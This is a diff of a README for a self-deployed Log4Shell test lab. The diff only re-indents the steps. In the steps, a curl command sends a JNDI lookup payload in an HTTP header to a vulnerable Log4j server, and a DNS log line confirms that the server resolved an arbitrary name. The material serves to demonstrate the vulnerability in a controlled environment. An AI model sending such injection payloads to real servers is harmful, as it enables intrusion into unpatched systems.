@@ -31,9 +31,12 @@ cdk deploy -c key_name=ssh-keypair-name -c ip=your-public-ip -v
 1. Note down the public IP of Log4ShellLog4JInstance and private IP of Log4ShellDNSInstance.
 2. Remote into Log4ShellDNSInstance using Session Manager or SSH. In that instance, run `journalctl -xe -u unbound -f`
 3. In your local machine, `curl -L http://log4j-public-ip -H 'X-Api-Version: ${jndi:dns://dns-private-ip/evil-request}'`
-  - The response will be `Hello, world!`.
+
+   - The response will be `Hello, world!`.
+
 4. Back in Log4ShellDNSInstance, it should show this log message,
-  - `# Jan 1 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: log4j-private-ip evil-request. A IN`
+
+   - `# Jan 1 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: log4j-private-ip evil-request. A IN`
 
 This demonstrate the ability to instruct a vulnerable server to make an arbitrary DNS request.
 
